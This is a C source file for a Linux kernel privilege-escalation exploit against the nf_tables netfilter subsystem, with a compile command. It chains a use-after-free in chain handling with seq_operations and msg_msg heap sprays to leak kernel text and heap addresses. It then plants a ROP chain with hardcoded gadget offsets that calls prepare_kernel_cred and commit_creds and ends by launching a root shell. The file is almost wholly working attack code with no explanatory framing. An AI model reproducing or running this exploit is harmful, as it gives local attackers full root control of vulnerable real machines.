#define _GNU_SOURCE
#include <stdio.h> 
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <time.h>
#include <stddef.h>
#include <pthread.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/msg.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <sys/mman.h>

#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nf_tables_compat.h>
#include <linux/netfilter/xt_AUDIT.h>

#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>

#include "libfunc.h"

#define PAGE_SIZE 0x1000

// gcc exploit.c libfunc.c -o exploit -lmnl -lnftnl -no-pie

// msg_msg stuff
#define NUM_MSQIDS 1024
#define MSG_TAG 0X41424344
#define MSG_MSG_SIZE (sizeof(struct msg_msg))
#define MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg))

int msqid[NUM_MSQIDS];

struct {
  long mtype;
  char mtext[64 - MSG_MSG_SIZE];
} message;

struct {
  long mtype;
  char mtext[96 - MSG_MSG_SIZE];
} msg_secondary;

struct {
    long mtype;
    char mtext[1024 - MSG_MSG_SIZE];
} msg_three;

struct {
    long mtype;
    char mtext[128 - MSG_MSG_SIZE];
} msg_chain;

struct {
    long mtype;
    char mtext[PAGE_SIZE - MSG_MSG_SIZE + 128 - MSG_MSGSEG_SIZE];
} msg_rop;

// seq_operations stuff
#define NUM_SEQOPS 512
int seqops[NUM_SEQOPS];

// Save state
unsigned long user_cs, user_ss, user_rflags, user_sp;
void save_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[+] Saved state");
}

// Get shell
void get_shell(void){
    puts("[+] Returned to userland");
    if (getuid() == 0){
        printf("[+] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}
unsigned long user_rip = (unsigned long)get_shell;

// Global variable for leak
uint64_t number = 0;

// Leak callback
int leak_cb(const struct nlmsghdr *nlh, void *data) {
    struct nftnl_rule *r;

    r = nftnl_rule_alloc();
    nftnl_rule_nlmsg_parse(nlh, r);
    nftnl_expr_foreach(r, data, NULL);
    nftnl_rule_free(r);
    
    return MNL_CB_OK;
}

int leak_expr_cb(struct nftnl_expr *e, void *dat)
{
    const char *data;
    number = 0;
    data = nftnl_expr_get_str(e, NFTNL_EXPR_IMM_CHAIN);
    number = *(uint64_t *)data;
    printf("[+] Leak: 0x%llx\n", number);

    return MNL_CB_OK;
}

// Request compat
int request_compat(struct mnl_socket *nl, const char *name, uint32_t rev, uint32_t type, int seq)
{
    int err = 0, rseq;
    struct nlmsghdr *nlh;
    struct nfgenmsg *msg;
    char buf[MNL_SOCKET_BUFFER_SIZE];

    printf("[+] Requesting compat module: %s\n", name);

    nlh = mnl_nlmsg_put_header(buf);
    nlh->nlmsg_type = (NFNL_SUBSYS_NFT_COMPAT << 8) | NFNL_MSG_COMPAT_GET;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_seq = rseq = seq++;

    msg = mnl_nlmsg_put_extra_header(nlh, sizeof(*msg));
    msg->nfgen_family = AF_INET;
    msg->version = NFNETLINK_V0;
    msg->res_id = 0;

    mnl_attr_put_strz(nlh, NFTA_COMPAT_NAME, name);
    mnl_attr_put_u32(nlh, NFTA_COMPAT_REV, htonl(rev));
    mnl_attr_put_u32(nlh, NFTA_COMPAT_TYPE, htonl(type));

    mnl_socket_sendto(nl, nlh, nlh->nlmsg_len);

    return err;
}

// Setup
void setup_stuff(void) {
    cpu_set_t pwn_cpu;
    CPU_ZERO(&pwn_cpu);
    CPU_SET(0, &pwn_cpu);
    if (sched_setaffinity(getpid(), sizeof(cpu_set_t), &pwn_cpu) < 0) {
        perror("[!] sched_setaffinity");
        exit(-1);
    }
}

// main
int main(void) {  
    // Parameters
    // Table
    char *table_name = "test_table";
    char *table_name_2 = "table2";
    uint8_t family = NFPROTO_IPV4;
    // Chain
    char *chain_name = "AAAAAAAAAAAAAAAAAAAA";
    char *chain_name_2 = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";
    struct unft_base_chain_param bp;
    bp.hook_num = NF_INET_LOCAL_OUT;
    bp.prio = 10;
    // Netlink batch message
    char buf[MNL_SOCKET_BUFFER_SIZE];
    struct nlmsghdr *nlh;
    struct mnl_nlmsg_batch *batch;
    int ret;
    int seq = time(NULL);
    int rseq = seq;

    // Setup
    printf("[+] SETUP\n");
    setup_stuff();
    unshare(CLONE_NEWUSER);
    unshare(CLONE_NEWNET);

    // Open netlink socket
    struct mnl_socket *nl = mnl_socket_open(NETLINK_NETFILTER);
    if (nl == NULL) {
		perror("mnl_socket_open");
		exit(EXIT_FAILURE);
	}
	
	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
		perror("mnl_socket_bind");
		exit(EXIT_FAILURE);
	} 
    
    // Save state
    save_state();
    
    // Setup message queues
    printf("[+] Setting up msg queues\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        if ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {
            perror("[!] msgget failed");
            exit(-1);
        }
    }
    
    // Request compat
    request_compat(nl, "AUDIT", 0, 1, seq);
    printf("\n");
    
    // Start nl message 1
    printf("[+] PHASE 1: KERNEL TEXT LEAK\n");
	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);
    
    // Create table 
    struct nftnl_table *t = build_table(table_name, NFPROTO_IPV4);
    family = nftnl_table_get_u32(t, NFTNL_TABLE_FAMILY);
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, family, NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_table_nlmsg_build_payload(nlh, t);
    nftnl_table_free(t);
    mnl_nlmsg_batch_next(batch);
    
    // Create chain 1
    struct nftnl_chain *c = build_chain(table_name, chain_name, NULL, 0x1234);
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN, family, NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, c);
	mnl_nlmsg_batch_next(batch);
    
    // Delete chain 1
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELCHAIN, family, NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, c);
    nftnl_chain_free(c); 
    mnl_nlmsg_batch_next(batch);
    
    // Create chain 2
    struct nftnl_chain *c2 = build_chain(table_name, "chain2", &bp, 10);
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN, family, NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, c2);
	nftnl_chain_free(c2);
	mnl_nlmsg_batch_next(batch);
    
    // Create rule pointing to chain 1
    struct nftnl_rule *r = build_rule(table_name, "chain2", family, NULL);
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, family, NLM_F_CREATE | NLM_F_ACK, seq++); 
    // Add immediate expr to rule
    struct nftnl_expr *e = nftnl_expr_alloc("immediate");
    nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
    nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, NFT_GOTO);
    nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_CHAIN_ID, 0x1234);
    nftnl_rule_add_expr(r, e); 
    nftnl_rule_nlmsg_build_payload(nlh, r);
    mnl_nlmsg_batch_next(batch); 

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);
    
    // Send netlink message
    printf("[+] Sending netlink message 1\n");
	ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
				mnl_nlmsg_batch_size(batch));
	if (ret == -1) {
		perror("mnl_socket_sendto");
		exit(EXIT_FAILURE);
	}
    mnl_nlmsg_batch_stop(batch);
    
    // Start nl message 2
    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);
    
    // Delete rule 1 
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELRULE, family, NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, r);
    mnl_nlmsg_batch_next(batch); 
    
    // Fail the batch using a invalid rule
    struct nftnl_rule *r2 = nftnl_rule_alloc();
    nftnl_rule_set_u32(r2, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
    nftnl_rule_set_str(r2, NFTNL_RULE_TABLE, table_name);
    nftnl_rule_set_str(r2, NFTNL_RULE_CHAIN, "chain2");

    struct xt_audit_info *audit_info;
    audit_info = malloc(sizeof(struct xt_audit_info));
    audit_info->type = 0xff;
    struct nftnl_expr *e2 = nftnl_expr_alloc("target");
    nftnl_expr_set_str(e2, NFTNL_EXPR_TG_NAME, "AUDIT");
    nftnl_expr_set_u32(e2, NFTNL_EXPR_TG_REV, 0);
    nftnl_expr_set_data(e2, NFTNL_EXPR_TG_INFO, audit_info, sizeof(struct xt_audit_info));
    nftnl_rule_add_expr(r2, e2);
    
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, family, NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, r2);
    mnl_nlmsg_batch_next(batch);
    
    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);
    
    // Send netlink message 2
    printf("[+] Sending netlink message 2\n");
    ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
		        mnl_nlmsg_batch_size(batch));
    if (ret == -1) {
        perror("mnl_socket_sendto");
        exit(EXIT_FAILURE);
    }
    mnl_nlmsg_batch_stop(batch);
    
    // Spray seq_operations to fill up kmalloc-cg-32 (chain->name)
    printf("[+] Spray seq_operations to fill up kmalloc-cg-32 chain->name\n");
    for (int i = 0; i < NUM_SEQOPS; i++) {
        seqops[i] = open("/proc/self/stat", O_RDONLY);
        if (seqops[i] < 0) {
            perror("[!] open");
            exit(-1);
        }
    }
    
    // Get kernel text address leak of single_start and calculate kbase
    char kbase_leak[0x10+1];
    uint64_t k_single_start = 0; // 0x4b2470 offset
    uint64_t kbase = 0;
    int err = 0;
    
    printf("[+] Getting leak\n");
    
    // Leak
    struct nftnl_rule *rleak = nftnl_rule_alloc();
    nftnl_rule_set_u32(rleak, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
    nftnl_rule_set_str(rleak, NFTNL_RULE_TABLE, table_name);
    nftnl_rule_set_str(rleak, NFTNL_RULE_CHAIN, "chain2");
    rseq = seq;
    
    nlh = nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETRULE, NFPROTO_IPV4, NLM_F_DUMP, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, rleak);
    mnl_socket_sendto(nl, buf, nlh->nlmsg_len);
    
    while (rseq < seq) {
        err = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        err = mnl_cb_run(buf, err, rseq, mnl_socket_get_portid(nl), leak_cb, leak_expr_cb);
        rseq += err == 0;
    }
    nftnl_rule_free(rleak);
    
    kbase = number - 0x4b2470;
    printf("[+] Kernel base: 0x%llx\n", kbase);

    // Close and free seq_operations
    printf("[+] Close and free seq_operations\n");
    for (int i = 0; i < NUM_SEQOPS; i++) {
        if (close(seqops[i]) < 0) {
            perror("[!] close");
            exit(-1);
        }
    }
    sleep(1);
    printf("\n");
    
    printf("[+] PHASE 2: KERNEL HEAP LEAK\n");
    
    // Start netlink message 3
    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);
	
    // Create table 
    struct nftnl_table *t2 = build_table(table_name_2, NFPROTO_IPV4);
    family = nftnl_table_get_u32(t2, NFTNL_TABLE_FAMILY);
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWTABLE, family, NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_table_nlmsg_build_payload(nlh, t2);
    nftnl_table_free(t2);
    mnl_nlmsg_batch_next(batch);
    	
	// Create chain 3
	struct nftnl_chain *c3 = build_chain(table_name_2, chain_name_2, NULL, 0x1235);
	nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWCHAIN, family, NLM_F_CREATE | NLM_F_ACK, seq++);
	nftnl_chain_nlmsg_build_payload(nlh, c3);
	mnl_nlmsg_batch_next(batch);
	
	// Delete chain 3
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELCHAIN, family, NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_chain_nlmsg_build_payload(nlh, c3);
    mnl_nlmsg_batch_next(batch);
    
    // Create rule pointing to victim chain 
    struct nftnl_rule *r3 = build_rule(table_name_2, "chain2", family, NULL);
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, family, NLM_F_CREATE | NLM_F_ACK, seq++); 
    // Add immediate expr to rule
    struct nftnl_expr *e3 = nftnl_expr_alloc("immediate");
    nftnl_expr_set_u32(e3, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
    nftnl_expr_set_u32(e3, NFTNL_EXPR_IMM_VERDICT, NFT_GOTO);
    nftnl_expr_set_u32(e3, NFTNL_EXPR_IMM_CHAIN_ID, 0x1235);
    nftnl_rule_add_expr(r3, e3); 
    nftnl_rule_nlmsg_build_payload(nlh, r3);
    mnl_nlmsg_batch_next(batch); 
    
    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);
    
    // Send netlink message 3
    printf("[+] Sending netlink message 3\n");
	ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
				mnl_nlmsg_batch_size(batch));
	if (ret == -1) {
		perror("mnl_socket_sendto");
		exit(EXIT_FAILURE);
	}
    mnl_nlmsg_batch_stop(batch);

    // Padding kmalloc-cg-96 spray
    int padding[1024];
    printf("[+] Padding msg_msg spray\n");
    for (int i = 0; i < 1024; i++) {
        if ((padding[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {
            perror("[!] msgget failed");
            exit(-1);
        }
    }
    for (int i = 0; i < 1024; i++) {
        memset(&msg_secondary, 0, sizeof(msg_secondary));
        *(long *)&msg_secondary.mtype = 0x42;
        *(int *)&msg_secondary.mtext[0] = MSG_TAG;
        *(int *)&msg_secondary.mtext[4] = i;
        if (msgsnd(padding[i], &msg_secondary, sizeof(msg_secondary) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    }
    
    // Start nl message 4
    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);
    
    // Delete rule 3 (test_chain_2)
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_DELRULE, family, NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, r3);
    mnl_nlmsg_batch_next(batch); 
    
    // Fail the batch using AUDIT
    struct nftnl_rule *r4 = nftnl_rule_alloc();
    nftnl_rule_set_u32(r4, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
    nftnl_rule_set_str(r4, NFTNL_RULE_TABLE, table_name);
    nftnl_rule_set_str(r4, NFTNL_RULE_CHAIN, "chain2");

    audit_info = malloc(sizeof(struct xt_audit_info));
    audit_info->type = 0xff;
    struct nftnl_expr *e4 = nftnl_expr_alloc("target");
    nftnl_expr_set_str(e4, NFTNL_EXPR_TG_NAME, "AUDIT");
    nftnl_expr_set_u32(e4, NFTNL_EXPR_TG_REV, 0);
    nftnl_expr_set_data(e4, NFTNL_EXPR_TG_INFO, audit_info, sizeof(struct xt_audit_info));
    nftnl_rule_add_expr(r4, e4);
    
    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, family, NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, r4);
    mnl_nlmsg_batch_next(batch);
    
    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    // Send netlink message 4
    printf("[+] Sending netlink message 4\n");
	ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
				mnl_nlmsg_batch_size(batch));
	if (ret == -1) {
		perror("mnl_socket_sendto");
		exit(EXIT_FAILURE);
	}
    mnl_nlmsg_batch_stop(batch);

    // msg_msg spray 
    printf("[+] Spraying msg_msg\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&message, 0, sizeof(message));
        *(long *)&message.mtype = 0x41;
        *(int *)&message.mtext[0] = MSG_TAG;
        *(int *)&message.mtext[4] = i;
        if (msgsnd(msqid[i], &message, sizeof(message) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    } 
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&msg_secondary, 0, sizeof(msg_secondary));
        *(long *)&msg_secondary.mtype = 0x42;
        *(int *)&msg_secondary.mtext[0] = MSG_TAG;
        *(int *)&msg_secondary.mtext[4] = i;
        if (msgsnd(msqid[i], &msg_secondary, sizeof(msg_secondary) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    }
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&msg_three, 0, sizeof(msg_three));
        *(long *)&msg_three.mtype = 0x43;
        *(int *)&msg_three.mtext[0] = MSG_TAG;
        *(int *)&msg_three.mtext[4] = i;
        if (msgsnd(msqid[i], &msg_three, sizeof(msg_three) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    }
    
    // Leak kmalloc-cg-96 heap value
    char kheap_96_leak[0x10+1];
    uint64_t kheap_96 = 0;
    
    // Leak
    rleak = nftnl_rule_alloc();
    nftnl_rule_set_u32(rleak, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
    nftnl_rule_set_str(rleak, NFTNL_RULE_TABLE, table_name);
    nftnl_rule_set_str(rleak, NFTNL_RULE_CHAIN, "chain2");
    rseq = seq;
    
    nlh = nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETRULE, NFPROTO_IPV4, NLM_F_DUMP, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, rleak);
    mnl_socket_sendto(nl, buf, nlh->nlmsg_len);
    
    while (rseq < seq) {
        err = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        err = mnl_cb_run(buf, err, rseq, mnl_socket_get_portid(nl), leak_cb, leak_expr_cb);
        rseq += err == 0;
    }
    nftnl_rule_free(rleak);
    
    kheap_96 = number;
    printf("[+] kmalloc-cg-96 address: 0x%llx\n", kheap_96); 
    
    // Leak kmalloc-cg-1024 address by spraying fake_chain
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&msg_chain, 0, sizeof(msg_chain));
        *(long *)&msg_chain.mtype = 0x44;
        *(int *)&msg_chain.mtext[0] = MSG_TAG;
        *(int *)&msg_chain.mtext[4] = i;
        *(uint64_t *)&msg_chain.mtext[40] = kheap_96+1;
        if (msgsnd(msqid[i], &msg_chain, sizeof(msg_chain) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    }
    
    // Process leak of kmalloc-cg-1024 heap value
    char kheap_1024_leak[0x10+1];
    uint64_t kheap_1024 = 0;
    
    // Leak
    rleak = nftnl_rule_alloc();
    nftnl_rule_set_u32(rleak, NFTNL_RULE_FAMILY, NFPROTO_IPV4);
    nftnl_rule_set_str(rleak, NFTNL_RULE_TABLE, table_name);
    nftnl_rule_set_str(rleak, NFTNL_RULE_CHAIN, "chain2");
    rseq = seq;
    
    nlh = nftnl_nlmsg_build_hdr(buf, NFT_MSG_GETRULE, NFPROTO_IPV4, NLM_F_DUMP, seq++);
    nftnl_rule_nlmsg_build_payload(nlh, rleak);
    mnl_socket_sendto(nl, buf, nlh->nlmsg_len);
    
    while (rseq < seq) {
        err = mnl_socket_recvfrom(nl, buf, sizeof(buf));
        err = mnl_cb_run(buf, err, rseq, mnl_socket_get_portid(nl), leak_cb, leak_expr_cb);
        rseq += err == 0;
    }
    nftnl_rule_free(rleak);
    
    kheap_1024 = number << 8;
    printf("[+] kmalloc-cg-1024 address: 0x%llx\n", kheap_1024);
    
    // Free the kmalloc-cg-1024 msg_msg
    printf("[+] Free kmalloc-cg-1024 msg_msg spray\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        if (msgrcv(msqid[i], &msg_three, sizeof(msg_three)-sizeof(long), 0x43, 0) < 0) {
            perror("[!] Free msg_msg failed");
            exit(-1);
        }
    }
    printf("\n");
    
    // Do all the ROP stuff in kmalloc-cg-1024
    printf("[+] PHASE 3: ROP\n");
    uint64_t fake_rule_addr = kheap_1024 + 0x230;
    printf("[+] Fake rule address: 0x%llx\n", fake_rule_addr);
    uint64_t fake_expr_addr = kheap_1024 + 0x260;
    printf("[+] Fake expr ops: 0x%llx\n", fake_expr_addr);
    // Make a fake rule 
    memset(&msg_three, 0, sizeof(msg_three));
    *(long *)&msg_three.mtype = 0x43;
    *(uint8_t *)&msg_three.mtext[0x215] = 0x10;
    *(long *)&msg_three.mtext[0x218] = fake_expr_addr;
    *(long *)&msg_three.mtext[0x278] = kbase + 0xba612a; // First rop point
    // 0xffffffff81ba612a : push rsi ; jmp qword ptr [rsi - 0x7f]
    
    // ROP!!!
    *(long *)&msg_three.mtext[0x199] = kbase + 0xd58be; // Second rop point
    // 0xffffffff810d58be : pop rsp ; pop r15 ; ret
    *(long *)&msg_three.mtext[0x220] = kbase + 0xd58c0; // pop rdi ; ret
    *(long *)&msg_three.mtext[0x228] = kbase + 0x2a1b600; // init_task
    *(long *)&msg_three.mtext[0x230] = kbase + 0x126bc0; // prepare_kernel_cred()
    *(long *)&msg_three.mtext[0x238] = kbase + 0xcb0f92; // pop rsi ; ret
    // 0xffffffff81cb0f92 : pop rsi ; ret 0
    *(long *)&msg_three.mtext[0x240] = kheap_1024 + 0x3a0 + 48 + 0x70; // rsi
    *(long *)&msg_three.mtext[0x248] = kbase + 0xd287b6; 
    // 0xffffffff81d287b6 : push rax ; jmp qword ptr [rsi - 0x70]
    // Jump point after push rax
    *(long *)&msg_three.mtext[0x3a0] = kbase + 0xd58c0; // pop rdi ; ret
    *(long *)&msg_three.mtext[0x250] = kbase + 0x1268e0; // commit_creds()
    *(long *)&msg_three.mtext[0x258] = kbase + 0xad163; // 4 pop
    *(long *)&msg_three.mtext[0x280] = kbase + 0x12011cb; // swapgs, iretq
    *(long *)&msg_three.mtext[0x288] = user_rip;
    *(long *)&msg_three.mtext[0x290] = user_cs;
    *(long *)&msg_three.mtext[0x298] = user_rflags;
    *(long *)&msg_three.mtext[0x2a0] = user_sp;
    *(long *)&msg_three.mtext[0x2a8] = user_ss;

    // Spray msg_msg of size 1024
    for (int i = 0; i < NUM_MSQIDS; i++) {
        if (msgsnd(msqid[i], &msg_three, sizeof(msg_three) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    }
    
    // Free msg_msg of size 128
    printf("[+] Free fake chain msg_msg spray\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        if (msgrcv(msqid[i], &msg_chain, sizeof(msg_chain)-sizeof(long), 0x44, 0) < 0) {
            perror("[!] Free msg_msg failed");
            exit(-1);
        }
    }
    
    // Spray fake chain for ROP via msgmsg_seg
    printf("[+] Spray fake chain for ROP\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&msg_rop, 0, sizeof(msg_rop));
        *(long *)&msg_rop.mtype = 0x43;
        *(long *)&msg_rop.mtext[4048+8] = fake_rule_addr;
        if (msgsnd(msqid[i], &msg_rop, sizeof(msg_rop)-sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    }
    
    // Register segmentation fault signal handler to get shell
    signal(SIGSEGV, get_shell);
    
    // Trigger ROP 
    struct nftnl_rule *rop_rule = build_rule(table_name, "chain2", family, NULL);
    struct nftnl_expr *rop_expr = nftnl_expr_alloc("immediate");
    nftnl_expr_set_u32(rop_expr, NFTNL_EXPR_IMM_DREG, NFT_REG_VERDICT);
    nftnl_expr_set_u32(rop_expr, NFTNL_EXPR_IMM_VERDICT, NFT_RETURN);
    nftnl_rule_add_expr(rop_rule, rop_expr);

    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);
	
	nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), NFT_MSG_NEWRULE, family, NLM_F_CREATE | NLM_F_ACK, seq++); 
    nftnl_rule_nlmsg_build_payload(nlh, rop_rule);
    mnl_nlmsg_batch_next(batch); 
    
    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);
    
    // Send netlink message 5
    printf("[+] Sending netlink message 5\n");
	ret = mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
				mnl_nlmsg_batch_size(batch));
	if (ret == -1) {
		perror("mnl_socket_sendto");
		exit(EXIT_FAILURE);
	}
    mnl_nlmsg_batch_stop(batch);
	
    return 0;
}
